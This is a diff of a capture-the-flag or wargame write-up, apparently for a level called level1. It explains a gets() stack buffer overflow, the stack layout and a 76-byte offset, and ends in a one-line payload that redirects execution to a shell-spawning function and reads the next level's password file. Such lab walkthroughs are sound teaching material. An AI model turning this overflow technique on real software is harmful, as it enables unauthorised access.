@@ -1,45 +1,70 @@
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (64)
-aaaaaaaaaaaaaaaa (16)
-aaaa (4)
-0x08048444 run function address
+Level1 - Buffer Overflow - ret2func
 
-Run function address: 0x08048444
-Little endian: \x44\x84\x04\x08  ← bytes reversed!
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08 (all command)
+=== Analysis ===
 
-(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+1. Ran "info functions" in GDB and found a suspicious
+   function called "run" at address 0x08048444 that
+   is never called by main.
 
+2. Disassembled run() and found:
+   - calls fwrite() → prints "Good... Wait what?"
+   - calls system("/bin/sh") → opens a shell as level2
 
+3. Disassembled main() and found:
+   - sub $0x50,%esp → allocates 80 bytes on stack
+   - lea 0x10(%esp),%eax → buffer starts 16 bytes from esp
+   - calls gets() → no size limit → buffer overflow vulnerability
+   - actual buffer size: 0x50 - 0x10 = 0x40 = 64 bytes
 
-What the assembly tells us
-asmsub $0x50,%esp        ← allocates 0x50 = 80 bytes on stack
-lea 0x10(%esp),%eax   ← buffer starts at esp+0x10 = 16 bytes offset
-call gets             ← reads input with NO size limit ← vulnerable!
-ret                   ← returns to... wherever return address points
-So the actual buffer size is:
-0x50 - 0x10 = 0x40 = 64 bytes
+=== Stack Layout ===
 
-The stack layout RIGHT NOW
-When main is executing, memory looks like this:
 
 High addresses
 ┌─────────────────────┐
-│ return address      │   4 bytes
+│ return address      │  4 bytes
 ├─────────────────────┤
 │ saved EBP           │  4 bytes
 ├─────────────────────┤
-│ 8 bytes (gap)       │  ← between buffer and EBP
+│ 8 bytes (padding)   │  ← between buffer and EBP (mostly for alignement of the stack 'compiler')
 ├─────────────────────┤
 │                     │
 |   buffer (64 bytes) │
 │                     │
 ├─────────────────────┤
-│ 8 bytes (padding)   │  ← below buffer
+│ 16 bytes (padding)  │  ← below buffer offset padding;
 └─────────────────────┘
 Low addresses  ← esp points here, stack grows this way
 
 
+=== Exploit Calculation ===
 
-"Note: shellcode injection is also possible here
-since NX is disabled — ret2func was chosen
-for simplicity"
+To reach return address:
+- 72 bytes → fill buffer and space up to EBP
+-  4 bytes → overwrite saved EBP
+= 76 bytes of padding before return address
+
+=== Address ===
+
+run() address:       0x08048444
+Little endian:       \x44\x84\x04\x08
+(x86 stores addresses with least significant byte first)
+
+=== Payload ===
+
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+
+- "A" * 76  → fills buffer + EBP (76 bytes of junk)
+- \x44\x84\x04\x08 → address of run() in little endian
+- cat → keeps stdin open so shell stays interactive
+
+=== Result ===
+
+Program jumps to run() → calls system("/bin/sh")
+→ interactive shell as level2
+→ cat /home/user/level2/.pass → [password]
+
+=== Note ===
+
+Shellcode injection is also a valid solution here
+since NX is disabled for this binary.
+ret2func was chosen for simplicity.
